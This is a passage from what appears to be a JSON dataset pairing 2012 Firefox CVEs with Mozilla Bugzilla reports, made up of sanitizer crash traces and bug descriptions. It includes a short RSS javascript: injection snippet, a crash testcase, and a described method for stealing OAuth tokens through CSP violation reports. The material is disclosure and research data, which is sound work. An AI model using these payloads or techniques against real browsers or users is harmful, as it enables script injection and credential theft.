js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:395 #46 0x7f9b25d8ff1b in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2435 #47 0x7f9b25d15317 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:267 #48 0x7f9b25e1c65f in js::InvokeKernel(JSContext*, js::CallArgs, js::MaybeConstruct) firefox/src/js/src/jsinterp.cpp:322 #49 0x7f9b257d8090 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/src/js/src/jsinterp.h:100 #50 0x7f9b25ad94f4 in js::CallOrConstructBoundFunction(JSContext*, unsigned int, JS::Value*) firefox/src/js/src/jsfun.cpp:862 #51 0x7f9b25e1c23d in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), js::CallArgs const&) firefox/src/js/src/jscntxtinlines.h:395 #52 0x7f9b257d8090 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) firefox/src/js/src/jsinterp.h:100 #53 0x7f9b25e2178d in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) firefox/src/js/src/jsinterp.cpp:354 #54 0x7f9b25682459 in JS_CallFunctionValue firefox/src/js/src/jsapi.cpp:5490 #55 0x7f9b1c571f81 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/src/js/xpconnect/src/XPCWrappedJSClass.cpp:1475 #56 0x7f9b1c523198 in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) firefox/src/js/xpconnect/src/XPCWrappedJS.cpp:579 #57 0x7f9b20c3c9a0 in PrepareAndDispatch firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 #58 0x7f9b20c3a137 in SharedStub firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 #59 0x7f9b20b38463 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:625 #60 0x7f9b207c7a0d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:216 #61 0x7f9b1f92b626 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #62 0x7f9b20de848a in MessageLoop::RunInternal() firefox/src/ipc/chromium/src/base/message_loop.cc:209 #63 0x7f9b20de82d3 in MessageLoop::RunHandler() firefox/src/ipc/chromium/src/base/message_loop.cc:202 0x7f9aecc43f3c is located 4 bytes to the right of 184-byte region [0x7f9aecc43e80,0x7f9aecc43f38) allocated by thread T0 here: #0 0x4a33e2 in malloc ??:0 #1 0x7f9b2d36b737 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f9b146d7483 in nsTArrayInfallibleAllocator::Malloc(unsigned long) firefox/src/../../dist/include/nsTArray.h:56 #3 0x7f9b154e96d8 in nsTArray_base<nsTArrayInfallibleAllocator>::EnsureCapacity(unsigned int, unsigned int) firefox/src/../../dist/include/nsTArray-inl.h:119 #4 0x7f9b16840a4d in nsTArray<AnimationPropertySegment, nsTArrayInfallibleAllocator>::AppendElements(unsigned int) firefox/src/../../dist/include/nsTArray.h:891 #5 0x7f9b16835ff8 in nsTArray<AnimationPropertySegment, nsTArrayInfallibleAllocator>::AppendElement() firefox/src/../../dist/include/nsTArray.h:906 #6 0x7f9b16834e62 in nsAnimationManager::BuildSegment(InfallibleTArray<AnimationPropertySegment>&, nsCSSProperty, nsAnimation const&, float, nsStyleContext*, mozilla::css::Declaration*, float, nsStyleContext*) firefox/src/layout/style/nsAnimationManager.cpp:805 #7 0x7f9b1682ea72 in nsAnimationManager::BuildAnimations(nsStyleContext*, InfallibleTArray<ElementAnimation>&) firefox/src/layout/style/nsAnimationManager.cpp:746 #8 0x7f9b16829a02 in nsAnimationManager::CheckAnimationRule(nsStyleContext*, mozilla::dom::Element*) firefox/src/layout/style/nsAnimationManager.cpp:442 #9 0x7f9b16d378d3 in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, bool, bool, nsIAtom*, nsCSSPseudoElements::Type, bool, mozilla::dom::Element*) firefox/src/layout/style/nsStyleSet.cpp:618 #10 0x7f9b16d3f06d in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) firefox/src/layout/style/nsStyleSet.cpp:953 #11 0x7f9b15aa8e90 in nsCSSFrameConstructor::ResolveStyleContext(nsStyleContext*, nsIContent*, nsFrameConstructorState*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4546 #12 0x7f9b15aa88ea in nsCSSFrameConstructor::ResolveStyleContext(nsIFrame*, nsIContent*, nsFrameConstructorState*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4533 #13 0x7f9b15aaea7b in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsIFrame*, nsCSSFrameConstructor::FrameConstructionItemList&) firefox/src/layout/base/nsCSSFrameConstructor.cpp:4986 #14 0x7f9b15ad1c98 in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsIContent*, bool) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6552 #15 0x7f9b15ac930f in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6244 #16 0x7f9b15ac9435 in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) firefox/src/layout/base/nsCSSFrameConstructor.cpp:6256 #17 0x7f9b15ad3a1b in nsCSSFrameConstructor::CreateNeededFrames() firefox/src/layout/base/nsCSSFrameConstructor.cpp:6270 #18 0x7f9b15ee3fab in PresShell::FlushPendingNotifications(mozFlushType) firefox/src/layout/base/nsPresShell.cpp:3813 #19 0x7f9b177360fe in nsDocument::FlushPendingNotifications(mozFlushType) firefox/src/content/base/src/nsDocument.cpp:6297 #20 0x7f9b1d6052a4 in nsDocLoader::DocLoaderIsEmpty(bool) firefox/src/uriloader/base/nsDocLoader.cpp:775 #21 0x7f9b1d609c1c in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/src/uriloader/base/nsDocLoader.cpp:704 #22 0x7f9b1d60b76d in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, unsigned int) firefox/src/modules/zlib/src/inffast.c:0 ==32187== ABORTING Stats: 148M malloced (160M for red zones) by 338879 calls Stats: 44M realloced by 18848 calls Stats: 111M freed by 216201 calls Stats: 0M really freed by 0 calls Stats: 340M (87089 full pages) mmaped in 85 calls mmaps by size class: 8:262128; 9:49146; 10:20475; 11:18423; 12:3072; 13:2048; 14:1536; 15:384; 16:512; 17:128; 18:160; 19:56; 20:16; mallocs by size class: 8:254257; 9:45545; 10:15976; 11:16377; 12:2361; 13:1796; 14:1413; 15:319; 16:512; 17:111; 18:149; 19:49; 20:14; frees by size class: 8:150107; 9:35624; 10:12657; 11:13226; 12:1528; 13:913; 14:1224; 15:268; 16:443; 17:97; 18:57; 19:46; 20:11; rfrees by size class: Stats: malloc large: 323 small slow: 1782 Shadow byte and word: 0x1ff35d9887e7: fb 0x1ff35d9887e0: 00 00 00 00 00 00 00 fb More shadow bytes: 0x1ff35d9887c0: fa fa fa fa fa fa fa fa 0x1ff35d9887c8: fa fa fa fa fa fa fa fa 0x1ff35d9887d0: 00 00 00 00 00 00 00 00 0x1ff35d9887d8: 00 00 00 00 00 00 00 00 =>0x1ff35d9887e0: 00 00 00 00 00 00 00 fb 0x1ff35d9887e8: fb fb fb fb fb fb fb fb 0x1ff35d9887f0: fa fa fa fa fa fa fa fa 0x1ff35d9887f8: fa fa fa fa fa fa fa fa 0x1ff35d988800: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-1954": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=765139",
        "title": "Heap-use-after-free in nsDocument::AdoptNode",
        "description": "This bug reproduces quite frequently in my fuzzing, however there is not reliable reproduction or minimized testcase. The ASAN free and alloc stacks might be helpful in fixing the bug. I will update bug if i get a reliable repro. 20120613124512 http://hg.mozilla.org/mozilla-central/rev/00244ceddd42 ================================================================= ==26295== ERROR: AddressSanitizer heap-use-after-free on address 0x7fe9741ba190 at pc 0x7fe983d5d952 bp 0x7fffbf205490 sp 0x7fffbf205488 READ of size 8 at 0x7fe9741ba190 thread T0 #0 0x7fe983d5d952 in nsTArray_base<nsTArrayDefaultAllocator>::Length() const firefox/src/../../../dist/include/nsTArray.h:192 #1 0x7fe984677dd2 in AdoptNodeIntoOwnerDoc(nsINode*, nsINode*) firefox/src/content/base/src/nsGenericElement.cpp:3743 #2 0x7fe984679178 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*) firefox/src/content/base/src/nsGenericElement.cpp:4346 #3 0x7fe984667ddc in nsINode::ReplaceOrInsertBefore(bool, nsIDOMNode*, nsIDOMNode*, nsIDOMNode**) firefox/src/content/base/src/nsGenericElement.cpp:518 #4 0x7fe984d5525d in DeleteElementTxn::UndoTransaction() firefox/src/editor/libeditor/base/DeleteElementTxn.cpp:159 #5 0x7fe9855391fc in nsTransactionItem::UndoTransaction(nsTransactionManager*) firefox/src/editor/txmgr/src/nsTransactionItem.cpp:198 0x7fe9741ba190 is located 272 bytes inside of 1376-byte region [0x7fe9741ba080,0x7fe9741ba5e0) freed by thread T0 here: #0 0x4244e2 in free #1 0x7fe9846a1beb in nsNodeUtils::LastRelease(nsINode*) firefox/src/content/base/src/nsNodeUtils.cpp:252 #2 0x7fe984610d22 in nsDocument::Release() firefox/src/content/base/src/nsDocument.cpp:1679 #3 0x7fe98469c8af in nsNodeInfo::Release() firefox/src/content/base/src/nsNodeInfo.cpp:185 #4 0x7fe984643c7a in nsNodeUtils::CloneAndAdopt(nsINode*, bool, bool, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&, nsIDOMNode**) firefox/src/../../../../dist/include/nsNodeUtils.h:272 #5 0x7fe984628b5a in nsNodeUtils::Adopt(nsINode*, nsNodeInfoManager*, JSContext*, JSObject*, nsCOMArray<nsINode>&) firefox/src/content/base/src/nsNodeUtils.h:172 #6 0x7fe984677dd2 in AdoptNodeIntoOwnerDoc(nsINode*, nsINode*) firefox/src/content/base/src/nsGenericElement.cpp:3743 #7 0x7fe984679178 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*) firefox/src/content/base/src/nsGenericElement.cpp:4346 #8 0x7fe984667ddc in nsINode::ReplaceOrInsertBefore(bool, nsIDOMNode*, nsIDOMNode*, nsIDOMNode**) firefox/src/content/base/src/nsGenericElement.cpp:518 #9 0x7fe984d5525d in DeleteElementTxn::UndoTransaction() firefox/src/editor/libeditor/base/DeleteElementTxn.cpp:159 #10 0x7fe9855391fc in nsTransactionItem::UndoTransaction(nsTransactionManager*) firefox/src/editor/txmgr/src/nsTransactionItem.cpp:198 previously allocated by thread T0 here: #0 0x4245a2 in malloc #1 0x7fe989dfe410 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 #2 0x7fe9845c9f81 in nsContentUtils::CreateDocument(nsAString_internal const&, nsAString_internal const&, nsIDOMDocumentType*, nsIURI*, nsIURI*, nsIPrincipal*, nsIScriptGlobalObject*, DocumentFlavor, nsIDOMDocument**) firefox/src/content/base/src/nsContentUtils.cpp:4226 #3 0x7fe98527552c in nsIDOMDOMImplementation_CreateDocument(JSContext*, unsigned int, JS::Value*) firefox/src/objdir-ff-asan/js/xpconnect/src/dom_quickstubs.cpp:6262 #4 0x7fe98666809f in js::InvokeKernel(JSContext*, js::CallArgs, js::MaybeConstruct) firefox/src/js/src/jscntxtinlines.h:395 #5 0x7fe98665e373 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) firefox/src/js/src/jsinterp.cpp:2435 #6 0x7fe98664b168 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) firefox/src/js/src/jsinterp.cpp:267 #7 0x7fe9866693c7 in js::ExecuteKernel(JSContext*, JSScript*, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) firefox/src/js/src/jsinterp.cpp:455 #8 0x7fe986669721 in js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) firefox/src/js/src/jsinterp.cpp:492 #9 0x7fe986586744 in EvaluateUCScriptForPrincipalsCommon(JSContext*, JSObject*, JSPrincipals*, JSPrincipals*, unsigned short const*, unsigned int, char const*, unsigned int, JS::Value*, JSVersion) firefox/src/js/src/jsapi.cpp:5356 #10 0x7fe9865869e9 in JS_EvaluateUCScriptForPrincipalsVersionOrigin firefox/src/js/src/jsapi.cpp:5393 #11 0x7fe984aa30ae in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) firefox/src/dom/base/nsJSEnvironment.cpp:1463 #12 0x7fe984afc51b in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) firefox/src/dom/base/nsGlobalWindow.cpp:9042 #13 0x7fe984aedadc in nsGlobalWindow::RunTimeout(nsTimeout*) firefox/src/dom/base/nsGlobalWindow.cpp:9306 #14 0x7fe984afb9d8 in nsGlobalWindow::TimerCallback(nsITimer*, void*) firefox/src/dom/base/nsGlobalWindow.cpp:9580 #15 0x7fe985d542e6 in nsTimerImpl::Fire() firefox/src/xpcom/threads/nsTimerImpl.cpp:473 #16 0x7fe985d54836 in nsTimerEvent::Run() firefox/src/xpcom/threads/nsTimerImpl.cpp:559 #17 0x7fe985d4a914 in nsThread::ProcessNextEvent(bool, bool*) firefox/src/xpcom/threads/nsThread.cpp:624 #18 0x7fe985cbb8fd in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:216 #19 0x7fe985acda2d in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/src/ipc/glue/MessagePump.cpp:82 #20 0x7fe985dbb43f in MessageLoop::Run() firefox/src/ipc/chromium/src/base/message_loop.cc:176 #21 0x7fe9858da96e in nsBaseAppShell::Run() firefox/src/widget/xpwidgets/nsBaseAppShell.cpp:165 #22 0x7fe983d019c3 in XREMain::XRE_main(int, char**, nsXREAppData const*) firefox/src/toolkit/xre/nsAppRunner.cpp:3858 ==26295== ABORTING Stats: 204M malloced (270M for red zones) by 709938 calls Stats: 38M realloced by 47616 calls Stats: 171M freed by 456977 calls Stats: 61M really freed by 86648 calls Stats: 476M (121916 full pages) mmaped in 119 calls mmaps by size class: 8:540639; 9:65528; 10:45045; 11:14329; 12:4096; 13:5120; 14:1792; 15:384; 16:768; 17:96; 18:176; 19:48; 20:16; mallocs by size class: 8:575429; 9:63598; 10:44465; 11:14417; 12:3815; 13:5233; 14:1576; 15:345; 16:719; 17:97; 18:183; 19:47; 20:14; frees by size class: 8:346550; 9:48317; 10:40427; 11:11219; 12:2991; 13:4933; 14:1293; 15:295; 16:651; 17:78; 18:167; 19:44; 20:12; rfrees by size class: 8:59414; 9:12639; 10:4862; 11:6621; 12:888; 13:574; 14:1048; 15:152; 16:347; 17:45; 18:25; 19:32; 20:1; Stats: malloc large: 341 small slow: 3125 Shadow byte and word: 0x1ffd2e837432: fd 0x1ffd2e837430: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffd2e837410: fd fd fd fd fd fd fd fd 0x1ffd2e837418: fd fd fd fd fd fd fd fd 0x1ffd2e837420: fd fd fd fd fd fd fd fd 0x1ffd2e837428: fd fd fd fd fd fd fd fd =>0x1ffd2e837430: fd fd fd fd fd fd fd fd 0x1ffd2e837438: fd fd fd fd fd fd fd fd 0x1ffd2e837440: fd fd fd fd fd fd fd fd 0x1ffd2e837448: fd fd fd fd fd fd fd fd 0x1ffd2e837450: fd fd fd fd fd fd fd fd"
      }
    ],
    "CVE-2012-1956": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=756719",
        "title": "Object.defineProperty can shadow window.location",
        "description": "Yet another variant of bug 735073, bug 665548, and bug 541530: it is possible to shadow the location object using Object.defineProperty. Verified with the current release build."
      }
    ],
    "CVE-2012-1957": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=750096",
        "title": "JavaScript execution via special HTML in RSS view; XSS when pasting malicious content into contenteditable",
        "description": "User Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 Build ID: 20120423123513 Steps to reproduce: It is possible to execute JavaScript on the Feed-View - indicating that there might be a security issue leading to RCE. The bug was found as a side-effect while crafting a RSS version of the H5SC. A PoC file is attached - please see below. The relevant part in the PoC file is this small snippet: <description><![CDATA[<embed src=\"javascript:top.SubscribeHandler.uninit=function(){alert('hello chrome://')}\">]]></description> Firefox doesn't seem to filter <embed> elements inside the RSS <description> properly - so we can exec JavaScript. This allows us to hook into the pre-existing script tags. Note the alert in the PoC file is not a \"classic website alert\" but indicates privileged script exec. The bug was found on Ubuntu 11.10: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0 I also tested in Win7 with Nightly (15.0.a1 - today's build) - same effect, JavaScript execution in Feed-View."
      }
    ],
    "CVE-2012-1958": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=750820",
        "title": "Use-after-free in nsGlobalWindow::PageHidden",
        "description": "Heap-use-after-free caught on Firefox 14.0a1, ASan log attached. Unfortunately no PoC at the moment - will try to catch it again."
      }
    ],
    "CVE-2012-1959": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=737559",
        "title": "\"Assertion failure: !proto->getClass()->ext.outerObject\"",
        "description": "Assertion failure: !proto->getClass()->ext.outerObject, at js/src/jsinferinlines.h:1162 This assertion was added in bug 719841."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=754044",
        "title": "Same-compartment security wrappers can be trivially bypassed by passing them to another compartment",
        "description": "Sigh. They're totally fucked. I don't know how we didn't think of this before. JS wrapping doesn't know about SCSWs. So our strategy is just inject them in places like NativeInterface2JSObject, and hope that nobody can actually touch the object. This works, mostly. Occasionally we find a hole (see bug 737559). But while debugging CPG wrapper reparenting fallout, I realized that there's a simple workaround. Cross-compartment wrappers don't go through SCSWs in most cases, but rather have the filtering policy built directly into them. So when an object is wrapped cross-compartment, the SCSW is stripped off. But when the object is read _back_, the JS engine has no idea that there was ever supposed to be a SCSW there. So it just says \"hey, the underlying object here is in the same compartment we're wrapping for. No wrappers needed!\" With compartment-per-global (i.e. Nightly), this is super easy make happen. Just load up a trivial iframe, define the security-checked property on its contentWindow, and read it back again. Boom. I wrote a testcase to confirm that this works. Without compartment-per-global (i.e. Aurora, Beta, ESR, and Release), it's a tiny bit trickier, since normally an origin only gets one compartment to play with. But this can be easily defeated by making the trivial iframe same-origin via document.domain (rather than by its true origin), which puts it in a separate compartment. I didn't write a testcase for this because it's 11pm and I'm tired, but I don't see why it wouldn't work just as well. On Nightly, we recently upped the ante by making the Components object protected by SCSWs (bug 735280). So this would in theory give full Components access to web content. But thankfully, I don't think gabor ever got around to removing the old-style CAPS check (did you, gabor?). So I think we're safe there for now. But we're still sitting ducks as far as Location and SOWs are concerned. So yeah, we need a story here. Pronto."
      }
    ],
    "CVE-2012-1960": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=761014",
        "title": "Out of bounds read in qcms_transform_data_rgb_out_lut_sse2",
        "description": "I received the following report from Tony Payne at Google \"The attached profiles respectively trigger SIGSEGV when looking up the output value for R, G or B when used as both the input and the output profile for test-transform.c\""
      }
    ],
    "CVE-2012-1961": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=761655",
        "title": "Firefox ignores X-Frame-Options when set to SAMEORIGIN, SAMEORIGIN (duplicated header)",
        "description": "Firefox ignores the \"X-Frame-Options: SAMEORIGIN, SAMEORIGIN\" header when the SAMEORIGIN value is duplicated. Some websites incorrectly have this duplicated header for some unknown reasons, see e.g. bug 761046. It would probably be fine to change the way nsDSURIContentListener::CheckFrameOptions parses this header to accept duplicated headers."
      }
    ],
    "CVE-2012-1962": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=764296",
        "title": "memory corruption of strings",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.54 Safari/536.5 Steps to reproduce: 1. Load http://bill.dojotoolkit.org/1.7/ffMemoryCorruption.html. (I'll also attach the test case, but it requires dojo to run, so the URL is simpler.) 2. Click the \"add another tab\" button repeatedly until the tabs overflow and a down arrow button appears on the upper right of the TabContainer. 3. Repeatedly click the down arrow button to display a menu of tabs, and click choices on the menu to navigate between tabs. Actual results: Eventually the menu tab navigation will stop working (usually after two or three times). In console (firebug or builtin web console) do this to see the root of the problem: contentTabs.getChildren().map(function(f){ return f.id; }).join(\", \") It shows corruption in the ids: [17:15:15.289] \"acceptProposedCo, kanji-characters-etc-here (bugzilla won't let me input them) \\x00\\x00\\x00\\x00\\x00\\x00âA\\x00\\x00\\x00\\x00 ... Note: occurs on both mac and windows, from version 8 to 14 and possibly earlier versions too. Expected results: The id's shouldn't change, they should be plain english strings: [17:27:56.750] \"NeweditorLayout1, NeweditorLayout2, NeweditorLayout3\""
      }
    ],
    "CVE-2012-1963": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=767778",
        "title": "Content Security Policy: violation reports leak OAuth 2.0 and OpenID credentials",
        "description": "The Content Security Policy (CSP) violation reports generated by Firefox include sensitive data within the \"blocked-uri\" parameter. In particular, they include fragment components and query strings even if the blocked-uri has a different origin than the protected resource (violating CSP 1.1 recommendations). Hence, a malicious website may use Firefox's CSP implementation to steal a user's OAuth 2.0 access tokens and OpenID credentials. This leads to serious attacks on popular social authorization servers such as Facebook and Google. For example, suppose a Yahoo user has previously used \"Sign in with Facebook\" to log in to Yahoo. Suppose also that the user is currently logged in to Facebook (she does not have to be logged in to Yahoo.) If she then visits attacker.com, this website can redirect her to Facebook's OAuth 2.0 endpoint, requesting an access token for the current user at Yahoo. Facebook issues a token and forwards the user to open.login.yahoo.com/#access_token=AAAXXX The key security mechanism of OAuth 2.0 is that this access token will only be sent to Yahoo, so even if the original token request was sent by an attacker, he will not be able to obtain the access token. Now, suppose attacker.com had a CSP that forbid connections to open.login.yahoo.com. Then Firefox will send a CSP violation report to \"report-uri\" that contains as its \"blocked-uri\" the full URL open.login.yahoo.com/#access_token=AAAXXX Hence, the attacker obtains the user's Facebook access token at Yahoo and may download sensitive user information from the Facebook API. For comparison, Chrome sends a \"blocked-uri\" that contains only the domain open.login.yahoo.com, avoiding the attack. A similar attack works for the Facebook OAuth 2.0 authorization code flow, allowing the attacker to steal the auth code and potentially log in as the user on Yahoo. A similar attack works on the Google OpenID interaction, where the attacker obtains the user's name and email address from Google and also a signed OpenID response that the attacker may potentially use to log in as the user to Yahoo. Demo: ---- As a proof of concept, we have built an attack webpage that silently retrieves (and stores) any visitor's names and email addresses from Facebook and Google. The preconditions for this demonstration: the visitor must be logged into Facebook or Google (in the same browser) and must have previously authorized Yahoo to access his Facebook or Google profile (by using Sign in with Facebook for example). The demo is at http://moscova.inria.fr/~karthik/csp/index.html Causes and Fixes: ----------------- The attack shown here was predicted (for a fictionalized version of OAuth) by Adam Barth in http://lists.w3.org/Archives/Public/public-web-security/2011Apr/0055.html Our demo shows that it is an effective attack on real OAuth and OpenID users, such as those using the Google, Facebook, Live, LinkedIn, and Dropbox APIs. The root issue is that Firefox does not implement the recommendations of CSP 1.1 on violation reports (section 4.15). Implementing them would disable the attack above. Specifically, Firefox must remove the <fragment> component from the blocked URI. This would prevent Facebook access tokens from being leaked. Since \"the origin of the blocked-uri is not the same as the origin of the protected resource\", Firefox should also removes the query string. This would prevent the Google OpenID identifiers from being leaked. About Us: -------- I lead a security research group called Prosecco at INRIA in France. http://prosecco.gforge.inria.fr Our work focuses on formal security proofs for cryptographic and web applications. We found this attack as part of a formal study of OAuth http://www.doc.ic.ac.uk/~maffeis/csf12.pdf We would welcome the opportunity to study any fixes you may propose and incorporate them into our analyses."
      }
    ],
    "CVE-2012-1965": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=758990",
        "title": "Don't allow feed: URLs with an innerURI that inherits the page's security context",
        "description": "\"feed:javascript:\" URLs can be used to XSS sites that just blacklist \"javascript:\" and \"data:\". (Issue raised by Mario Gomes in bug 758907 comment 5, and brought to my attention by Reed Loden.)"
      }
    ],
    "CVE-2012-1966": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=734076",
        "title": "XSS with context menu",
        "description": "http://mxr.mozilla.org/mozilla-central/source/browser/base/content/nsContextMenu.js showOnlyThisFrame, viewMedia and viewBGImage disallow javascript: url but allow data: url. Thus, it's possible to perform an XSS attack using data: url."
      }
    ],
    "CVE-2012-1968": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=777398",
        "title": "[SECURITY] HTML bugmail exposes information about restricted bugs",
        "description": "html bugmail uses the bug_link filter to linkify 'bug NNN' text, both within comments, and when other bugs are referenced (eg blockers, dependencies). the bug_link code always tests if the current user has access to the bug it's marking up, and if not, it sets the title to just the bug's status. however when constructing bugmail, the current user is the user which made the change -- we need to test if to_user has access to the bug."
      }
    ],
    "CVE-2012-1969": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=777586",
        "title": "[SECURITY] The description of private attachments is still visible to unauthorized users when mentioned in a comment",
        "description": "When a user who can see a private attachment (i.e. a member of the insidergroup) mentions a private attachment in a public comment, then all users who can see the public comment can also see the description of the private attachment despite they are not allowed to view this attachment (note that this attachment is not listed in the attachments table for that reason, unless you are a member of the insidergroup). The reason is that get_attachment_link() only checks if the bug itself is public or not to decide if the attachment description can be seen by the user or not, despite you can have private attachments on public bugs. This problem exists since attachment IDs are linkified in comments, i.e since Bugzilla 2.17.5, see bug 153583. I will probably fix this bug in the same patch as bug 777398."
      }
    ],
    "CVE-2012-1970": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=775206",
        "title": "Random IndexedDB crashes with Trial Tool",
        "description": "If I open up the \"Trial Tool\" at http://nparashuram.com/trialtool/index.html#example=/IndexedDB/trialtool/moz_indexedDB.html&selected=#db& and then do a bunch of running of various testcases in somewhat random orders (I only used prereqs, open, open+1, delete, close, create obj store, delete obj store, list obj store -- didn't touch anything below that), I can often get a crash when I reload the page. I've reproduced it twice with the following two different crash reports https://crash-stats.mozilla.com/report/index/bp-f489fa2b-96a0-4031-b91a-5966a2120718 https://crash-stats.mozilla.com/report/index/bp-4439b6f2-778c-4153-80af-324ee2120718 Had a harder time doing it a third time. 2012-07-18 m-c nightly."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=761831",
        "title": "\"ASSERTION: obj must be a wrapper\" with document.open during DOMNodeRemoved event",
        "description": "###!!! ASSERTION: obj must be a wrapper: 'IS_WRAPPER_CLASS(js::GetObjectClass(obj)) || js::GetObjectClass(obj) == &XPC_WN_Tearoff_JSClass', file js/xpconnect/src/XPCQuickStubs.cpp, line 374"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=764176",
        "title": "Crash with gradient, hugeness, \"-moz-appearance: statusbar\"",
        "description": "No description provided."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=745158",
        "title": "Crash [@ Decompile] with let expressions",
        "description": "The following test crashes on mozilla-central revision 3fa30b0edd15 (options -m -n -a), 32 bit opt build: let ([] = 1) 3; let (i) new [i][print[i]]; Valgrind Errors: ==59269== Conditional jump or move depends on uninitialised value(s) ==59269== at 0x80F970B: Decompile(SprintStack*, unsigned char*, int) (jsopcode.cpp:5077) ==59269== by 0x81004DD: DecompileCode(JSPrinter*, JSScript*, unsigned char*, unsigned int, unsigned int) (jsopcode.cpp:5404) ==59269== by 0x81006F0: DecompileExpression(JSContext*, JSScript*, JSFunction*, unsigned char*) (jsopcode.cpp:5810) ==59269== by 0x81009C1: js_DecompileValueGenerator (jsopcode.cpp:5699) ==59269== by 0x807E97C: js_ReportValueErrorFlags(JSContext*, unsigned int, unsigned int, int, JS::Value const&, JSString*, char const*, char const*) (jsopcode.h:401) ==59269== by 0x809A7BF: js_ReportIsNotFunction(JSContext*, JS::Value const*, unsigned int) (jsfun.cpp:1383) ==59269== by 0x80CDAC5: js::InvokeConstructorKernel(JSContext*, js::CallArgs const&) (jsinterp.cpp:605) ==59269== by 0x80C1FF8: js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) (jsinterp.cpp:2682) ==59269== by 0x80CD563: js::RunScript(JSContext*, JSScript*, js::StackFrame*) (jsinterp.cpp:472) ==59269== by 0x80CE129: js::Execute(JSContext*, JSScript*, JSObject&, JS::Value*) (jsinterp.cpp:670) ==59269== by 0x806160C: JS_ExecuteScript (jsapi.cpp:5247) ==59269== by 0x805030D: Process(JSContext*, JSObject*, char const*, bool) (js.cpp:478) (twice) ==59269== Invalid read of size 1 ==59269== at 0x80F9700: Decompile(SprintStack*, unsigned char*, int) (jsopcode.cpp:5077) ==59269== by 0x81004DD: DecompileCode(JSPrinter*, JSScript*, unsigned char*, unsigned int, unsigned int) (jsopcode.cpp:5404) ==59269== by 0x81006F0: DecompileExpression(JSContext*, JSScript*, JSFunction*, unsigned char*) 